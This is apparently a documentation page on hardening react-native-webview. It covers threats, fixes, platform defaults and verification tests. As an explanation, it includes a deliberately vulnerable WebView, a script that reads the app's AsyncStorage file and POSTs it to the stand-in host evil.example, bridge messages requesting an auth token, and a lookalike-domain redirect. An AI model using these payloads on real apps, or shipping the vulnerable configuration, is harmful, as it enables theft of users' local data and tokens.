---
title: WebView Hardening
description: A WebView puts remote HTML inside your app's process. Lock down origins, file access, injected script and the postMessage boundary.
status: current
toolchain: cli
---

A `WebView` is the largest trust boundary most React Native apps have. You are rendering code you
did not write, fetched at runtime, inside your process, often with a message channel back into
your JavaScript. Every other page in this section is about data you control; this one is about
code you do not.

Everything here is verified against `react-native-webview` 14.0.1 as installed, including the
parts of its own source that decide what the props actually do. Several of the defaults are more
permissive than people assume, and one of them — `originWhitelist` — behaves differently from how
its name reads.

## Threat

The attacker's goal is to get script running inside your WebView and then use it to reach
something native. Ways in, from most to least common:

1. **A page you allow-listed loads third-party content.** An ad network, an analytics tag, a chat
   widget, an embedded iframe. You trusted the origin; the origin trusted someone else.
2. **A cross-site scripting bug on your own site.** Your web team's XSS becomes your mobile app's
   native bridge exposure.
3. **A navigation you did not intend.** A link, a redirect chain, or `window.open` moves the
   WebView to an origin you never considered.
4. **A URL supplied from outside the app.** A deep link carrying a `url` parameter that ends up in
   `source={{uri}}`. See [Deep Link Validation](deep-link-validation.md).

Once script runs, what it can reach depends entirely on the props you set.

## Exploit

### Step 1 — the default-configured WebView

```tsx title=src/screens/VulnerableWebScreen.tsx — do not ship this
import React from 'react';
import {WebView} from 'react-native-webview';
import type {WebViewMessageEvent} from 'react-native-webview';

/**
 * Every dangerous default is left in place and the message handler trusts the
 * page. This is what a WebView looks like when nobody thought about it.
 */
export function VulnerableWebScreen({url}: {url: string}) {
  const onMessage = (event: WebViewMessageEvent) => {
    // The page chose this string. Parsing it as a command is the bug.
    const command = JSON.parse(event.nativeEvent.data) as {
      type: string;
      payload: unknown;
    };
    if (command.type === 'getAuthToken') {
      // Handing a token to remote HTML on request.
      void command.payload;
    }
  };

  return (
    <WebView
      source={{uri: url}}
      // No originWhitelist, no onShouldStartLoadWithRequest, file access on,
      // and a message channel wired straight into app logic.
      allowFileAccess
      allowFileAccessFromFileURLs
      allowUniversalAccessFromFileURLs
      onMessage={onMessage}
    />
  );
}
```

### Step 2 — reach the bridge from the page

Any script running in the document can call the injected global. There is no origin check on it,
no sender identity, and nothing distinguishing your own script from an advertiser's:

```js title=hosted on the loaded page, or injected by anything running in it
// This is all an attacker needs. It works from an iframe's parent document,
// from an injected ad script, from an XSS payload.
window.ReactNativeWebView.postMessage(
  JSON.stringify({type: 'getAuthToken', payload: null}),
);
```

### Step 3 — read the filesystem

With `allowFileAccess`, `allowFileAccessFromFileURLs` and
`allowUniversalAccessFromFileURLs` enabled, a document loaded from a `file://` URL can read other
local files and send them anywhere:

```js title=what runs in the page once it has a file:// origin
fetch('file:///data/data/com.example.app/databases/AsyncStorage')
  .then((r) => r.text())
  .then((body) => fetch('https://evil.example/collect', {method: 'POST', body}));
```

`allowUniversalAccessFromFileURLs` is the one that turns a local page into a universal reader: it
removes the same-origin restriction entirely for `file://` documents.

### Step 4 — the `originWhitelist` trap

This is the finding most teams are surprised by, and you can verify it by reading
`src/WebViewShared.tsx` in the installed package. Each entry is turned into a regular expression
by escaping it, replacing `*` with `.*`, and anchoring it at the **start only**:

```text
'https://example.com'  ->  /^https:\/\/example\.com/
```

That pattern is then tested against the origin extracted from the URL. Because there is no end
anchor, the following all pass a whitelist of `['https://example.com']`:

```text
https://example.com.evil.test/
https://example.community/
https://example.commerce-partner.test/
```

Two further behaviours worth knowing before you rely on this prop:

- **The default is `['http://*', 'https://*']`** — every web origin, and plain HTTP included.
- **A URL that fails the whitelist is not blocked.** The library calls `Linking.canOpenURL` and
  then `Linking.openURL` on it, so the navigation is handed to the system browser or to whichever
  app claims that scheme. `about:blank` is always allowed.

So `originWhitelist` decides *where the page opens*, not *whether the user reaches it*.

## Fix

### 1. Lock the origin properly, with two layers

Use `originWhitelist` with a trailing slash so the prefix match cannot slide onto a longer
hostname, and then use `onShouldStartLoadWithRequest` as the real allow-list. Note the order the
library applies them: `onShouldStartLoadWithRequest` is only consulted for URLs that already
passed the whitelist, so it narrows, never widens.

```tsx title=src/screens/HardenedWebScreen.tsx
import React, {useCallback} from 'react';
import {WebView} from 'react-native-webview';
import type {WebViewProps, WebViewMessageEvent} from 'react-native-webview';

/** Exact origins, each with the trailing slash that stops prefix slippage. */
const ALLOWED_ORIGINS = ['https://app.example.com/', 'https://cdn.example.com/'];

/** Full URL prefixes the WebView may navigate to, checked independently. */
const ALLOWED_URL_PREFIXES = [
  'https://app.example.com/',
  'https://cdn.example.com/assets/',
];

export function HardenedWebScreen() {
  /**
   * The second, authoritative check. Returning false stops the navigation
   * inside the WebView; it does not hand the URL to the system browser, which
   * is what a failed originWhitelist match does.
   */
  const onShouldStartLoadWithRequest = useCallback<
    NonNullable<WebViewProps['onShouldStartLoadWithRequest']>
  >((request) => {
    if (!request.isTopFrame) {
      // Subframe loads are a separate decision. Decide deliberately rather
      // than letting the top-frame rule leak into iframes.
      return false;
    }
    return ALLOWED_URL_PREFIXES.some((prefix) => request.url.startsWith(prefix));
  }, []);

  const onMessage = useCallback((event: WebViewMessageEvent) => {
    handleWebMessage(event.nativeEvent.data);
  }, []);

  return (
    <WebView
      source={{uri: 'https://app.example.com/embedded'}}
      originWhitelist={ALLOWED_ORIGINS}
      onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
      onMessage={onMessage}
      // Filesystem: off, all three, on both platforms.
      allowFileAccess={false}
      allowFileAccessFromFileURLs={false}
      allowUniversalAccessFromFileURLs={false}
      // No popups: a new window is a navigation you did not review.
      setSupportMultipleWindows={false}
      javaScriptCanOpenWindowsAutomatically={false}
      // No HTTP resources inside an HTTPS page. 'never' is the default; being
      // explicit stops a later edit from quietly changing it.
      mixedContentMode="never"
      // Do not lend the page your cookie jar or your third-party cookies.
      sharedCookiesEnabled={false}
      thirdPartyCookiesEnabled={false}
      // Remote debugging must never be on in a shipped build.
      webviewDebuggingEnabled={__DEV__}
    />
  );
}

function handleWebMessage(_raw: string): void {
  // Implemented in the postMessage section below.
}
```

### 2. Decide about `javaScriptEnabled` honestly

`javaScriptEnabled` defaults to `true` and, per the prop's own documentation in the installed
types, it is **an Android-only prop — JavaScript is always enabled on iOS**. There is no
cross-platform "turn off JavaScript" switch in this library.

```tsx title=src/screens/StaticContentWebView.tsx
import React from 'react';
import {WebView} from 'react-native-webview';

/**
 * For rendering trusted static HTML — a help article, a rendered invoice —
 * there is no reason for script to run. On Android this genuinely disables it.
 * On iOS it does not, so the content still has to be content you control.
 */
export function StaticContentWebView({html}: {html: string}) {
  return (
    <WebView
      originWhitelist={['about:blank']}
      source={{html}}
      javaScriptEnabled={false}
      allowFileAccess={false}
      allowFileAccessFromFileURLs={false}
      allowUniversalAccessFromFileURLs={false}
      setSupportMultipleWindows={false}
    />
  );
}
```

> [!WARNING] `source={{html}}` is not automatically safe
> Inline HTML loads with an opaque or `about:blank` origin, which limits what it can reach — but
> if any part of that string came from user input or from a server response, you have built an
> XSS sink. Escape it, or render it with React Native components instead.

### 3. Treat `injectedJavaScript` as code you are writing into someone else's page

Injected script runs in the page's context with the page's privileges. Two consequences people
miss:

- **The page can read it.** Anything you interpolate into the string — a token, a user id, an
  internal URL — is visible to every script in that document.
- **The page can redefine what it calls.** If your injected code calls
  `window.ReactNativeWebView.postMessage`, the page can have replaced that function first.

The injection bug itself is ordinary string concatenation:

```ts title=src/webview/injection.ts
/** Wrong: a value with a quote or a newline in it ends the string and starts code. */
export function unsafeInjection(userName: string): string {
  return `document.title = '${userName}'; true;`;
}

/**
 * Right: serialise through JSON.stringify so the value can only ever be a
 * string literal. The trailing `true;` suppresses a warning about the
 * injected script's return value on iOS.
 */
export function safeInjection(userName: string): string {
  return `document.title = ${JSON.stringify(userName)}; true;`;
}
```

If you need to pass structured data in, `injectedJavaScriptObject` is the cleaner route — it is
serialised for you and exposed to the page as JSON. It is still readable by the page, so the rule
does not change: nothing secret goes in.

`injectedJavaScriptForMainFrameOnly` defaults to `true` and is mandatory on Android. Setting it
to `false` on iOS runs your script inside every iframe, including third-party ones. Leave it at
the default unless you have a specific reason and have read the frames you would be injecting
into.

### 4. The `postMessage` trust boundary

`window.ReactNativeWebView.postMessage` is injected into the page whenever you set `onMessage`.
There is no sender, no origin, and no authentication attached to the message — only a string.
Anything running in that document, at any origin the document has pulled script from, can send
anything.

So the boundary is: **`onMessage` is a public, unauthenticated endpoint exposed to remote code.**
Design it that way.

```ts title=src/webview/messageBridge.ts
/**
 * A closed set of messages the web content may send. There is no generic
 * "call this function" or "navigate to this route" message, because such a
 * message hands control of the app to the page.
 */
type WebMessage =
  | {type: 'contentHeight'; height: number}
  | {type: 'requestClose'}
  | {type: 'analyticsEvent'; name: string};

const ANALYTICS_NAMES = ['view_terms', 'accept_terms', 'decline_terms'] as const;

/** Parses and validates. A message that does not fit is dropped silently. */
export function parseWebMessage(raw: string): WebMessage | null {
  if (raw.length > 4096) {
    // A page can send megabytes. Bound it before parsing.
    return null;
  }

  let value: unknown;
  try {
    value = JSON.parse(raw);
  } catch {
    return null;
  }

  if (typeof value !== 'object' || value === null) {
    return null;
  }
  const message = value as Record<string, unknown>;

  switch (message.type) {
    case 'contentHeight':
      return typeof message.height === 'number' &&
        Number.isFinite(message.height) &&
        message.height >= 0 &&
        message.height < 100000
        ? {type: 'contentHeight', height: message.height}
        : null;

    case 'requestClose':
      return {type: 'requestClose'};

    case 'analyticsEvent':
      return typeof message.name === 'string' &&
        (ANALYTICS_NAMES as readonly string[]).includes(message.name)
        ? {type: 'analyticsEvent', name: message.name}
        : null;

    default:
      return null;
  }
}
```

Rules that follow, and that are worth writing into a review checklist:

- **No message may name a screen, a function, a URL or a native module.** Those are the four
  shapes that turn the bridge into remote code execution against your app.
- **No message may cause a privileged action on its own.** Closing a modal is fine. Confirming a
  payment is not, unless a native confirmation step sits in between.
- **Nothing flows outward that the page could not already get.** Do not answer a message by
  posting a token back with `webViewRef.current.postMessage(token)`.
- **Validate types, ranges and lengths.** The data is a string from a stranger; `JSON.parse` on it
  is the first thing that can go wrong.

## Platform differences

:::tabs
@tab iOS
The underlying view is `WKWebView`.

- **JavaScript cannot be disabled** through `javaScriptEnabled` — that prop is Android-only.
- `limitsNavigationsToAppBoundDomains` is a real, OS-enforced restriction: set it to `true` and
  list up to ten domains under the `WKAppBoundDomains` key in `ios/<App>/Info.plist`. Navigation
  outside that set fails with an app-bound domain error. This is stronger than anything the
  library implements in JavaScript, because WebKit enforces it.
- `sharedCookiesEnabled` defaults to `false`. Turning it on gives the page the app's
  `HTTPCookieStorage`, including cookies for other hosts your app has talked to.
- `incognito` prevents the WebView from persisting data for its lifetime — useful for a sign-in
  flow you do not want cached.
- `allowingReadAccessToURL` widens what a `file://` document may read. Leave it unset unless you
  are deliberately serving a local bundle, and then scope it to that directory.
- Transport rules come from ATS, so an HTTP page inside the WebView is subject to the same
  `Info.plist` settings as `fetch`. See [Network Security Config and ATS](network-security-config.md).

@tab Android
The underlying view is `android.webkit.WebView`, a system component updated through Play.

- `allowFileAccess` defaults to `false` in this library's Android implementation, which is the
  right default. `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` should stay
  false too.
- `setSupportMultipleWindows` is set to `true` by the manager by default. With it on, the page can
  open new windows; pair it with `onOpenWindow` if you need it, or set it to `false`.
- `mixedContentMode` defaults to `'never'`. `'always'` lets an HTTPS page load HTTP subresources
  and is a downgrade attack waiting to happen.
- `thirdPartyCookiesEnabled` defaults to `true`.
- `onRenderProcessGone` fires when the WebView process is killed. Without a handler the app can
  crash; it is a reliability issue rather than a security one, but it shows up in the same audits.
- Cleartext rules come from the network security config, which applies to the WebView as well. A
  WebView is not exempt.
:::

## Verification

### 1. Prove the origin restriction actually restricts

Point a test build at a page that immediately navigates somewhere else and watch what happens:

```html
<!-- Host this on an origin you control for testing. -->
<script>
  location.href = 'https://app.example.com.evil.test/';
</script>
```

With only `originWhitelist={['https://app.example.com']}` the navigation passes the prefix regex.
With the trailing slash and the `onShouldStartLoadWithRequest` check above, it is refused. Run
both and see the difference rather than trusting the prop name.

### 2. Prove the bridge rejects unknown messages

From the loaded page's console, or from an `injectedJavaScript` you add temporarily in a debug
build:

```js
window.ReactNativeWebView.postMessage(JSON.stringify({type: 'navigate', screen: 'Admin'}));
window.ReactNativeWebView.postMessage(JSON.stringify({type: 'getAuthToken'}));
window.ReactNativeWebView.postMessage('x'.repeat(1000000));
```

Nothing should happen for any of the three, and the app should not hang on the third.

### 3. Prove file access is off

Load a page that tries to read a local file and confirm the fetch fails:

```js
fetch('file:///android_asset/index.html')
  .then(() => console.log('FAIL: file read succeeded'))
  .catch(() => console.log('OK: file read blocked'));
```

### 4. Grep the release build for debugging flags

```bash
# webviewDebuggingEnabled must be behind __DEV__, never a literal true.
grep -rn "webviewDebuggingEnabled" src/ | grep -v "__DEV__"

# And no origin wildcards left behind.
grep -rn "originWhitelist" src/ | grep -E "\*|http://"
```

Both should print nothing. Add them to the checks that run before a release alongside the rest of
the [Release Checklist](../build-and-release/release-checklist.md).

## What a hardened WebView still does not stop

- **A compromised allow-listed origin.** If `app.example.com` is serving attacker script, every
  control on this page is satisfied and the attacker is inside. The WebView boundary is only as
  good as the origins you trust.
- **The user reading the page.** A WebView is a browser. Anything rendered in it is visible, and
  anything it fetches can be observed on a device the attacker controls.
- **Extraction of whatever you injected.** `injectedJavaScript` and `injectedJavaScriptObject` are
  readable by the page and, since they are string literals in your bundle, by anyone with the
  APK.

## Common mistakes

- **Trusting `originWhitelist` as a security boundary.** It is a prefix match with no end anchor,
  and a failed match opens the URL in the system browser rather than blocking it. Add
  `onShouldStartLoadWithRequest`.
- **Writing an origin without a trailing slash.** Wrong: `['https://example.com']`, which matches
  `https://example.com.evil.test`. Right: `['https://example.com/']`.
- **Leaving the default whitelist in place.** The default is `['http://*', 'https://*']` — every
  origin on the web, plaintext included.
- **Enabling `allowUniversalAccessFromFileURLs` to fix a local-asset bug.** It removes same-origin
  enforcement for local documents. Fix the asset path instead.
- **Believing `javaScriptEnabled={false}` disables JavaScript everywhere.** It is Android-only.
  On iOS the script still runs.
- **Building the injected script with template concatenation.** A quote in the value ends your
  string and begins the attacker's. Use `JSON.stringify` for every interpolated value.
- **Treating `onMessage` as a private channel to your own web app.** It is reachable by every
  script in the document, including third-party ones. Validate every field.
- **Sending a token back through `postMessage` because the page asked.** Once it is in the page it
  is in every script the page loads.
- **Shipping `webviewDebuggingEnabled` as `true`.** It lets anyone with the device attached to a
  desktop browser inspect and script the WebView.
- **Passing a deep-link URL straight into `source`.** That makes your allow-list irrelevant,
  because the attacker chooses the origin. See [Deep Link Validation](deep-link-validation.md).

## Related topics

- [Deep Link Validation](deep-link-validation.md) — where a hostile URL usually comes from.
- [Network Security Config and ATS](network-security-config.md) — the transport rules that apply inside the WebView too.
- [Threat Model](threat-model.md) — the trust boundary this page is defending.
- [Why Secrets in JS Are Readable](secrets-in-the-bundle.md) — why an injected script cannot carry a secret.
- [Safe Logging in Release Builds](safe-logging.md) — WebView console output ends up in the device log.
- [Release Checklist](../build-and-release/release-checklist.md) — where the greps above belong.
